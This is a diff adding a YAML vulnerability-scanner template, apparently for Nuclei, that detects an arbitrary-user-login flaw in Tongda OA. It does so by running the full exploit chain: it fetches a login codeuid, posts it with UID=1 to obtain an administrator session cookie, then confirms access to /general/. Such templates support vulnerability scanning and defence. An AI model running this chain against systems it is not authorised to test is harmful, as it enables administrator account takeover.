@@ -1,0 +1,95 @@
+id: tongda-oa-arbitrary-user-login
+
+info:
+  name: Tongda OA Arbitrary User Login Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative
+    office automation software developed by Beijing Tongda Xinke Technology Co., Ltd.
+    The software contains a vulnerability that allows an attacker to log in as any user,
+    gain administrative permissions, and perform sensitive operations.
+  tags: permission-bypass
+
+flow: |
+  http(1) && http(2) && http(3) && http(4)
+
+http:
+  - id: check-instance
+    method: GET
+    path:
+      - "{{BaseURL}}/inc/expired.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "tongda"
+
+  - id: fetch-codeuid
+    method: GET
+    path:
+      - "{{BaseURL}}/ispirit/login_code.php"
+    extractors:
+      - type: regex
+        name: codeuid
+        internal: true
+        regex:
+          - '\{"codeuid":"\\{(.*?)\\}"}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"codeuid\""
+
+  - id: fetch-session-id
+    method: POST
+    path:
+      - "{{BaseURL}}/logincheck_code.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "UID=1&CODEUID=_PC{{codeuid}}"
+    extractors:
+      - type: regex
+        name: sessionid
+        internal: true
+        regex:
+          - "Set-Cookie: PHPSESSID=(.*?);"
+        part: header
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"status\":1"
+          - "\"url\":\"general"
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: PHPSESSID="
+
+  - id: confirm-login
+    method: GET
+    path:
+      - "{{BaseURL}}/general/"
+    headers:
+      Cookie: "PHPSESSID={{sessionid}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "tongdainfo"
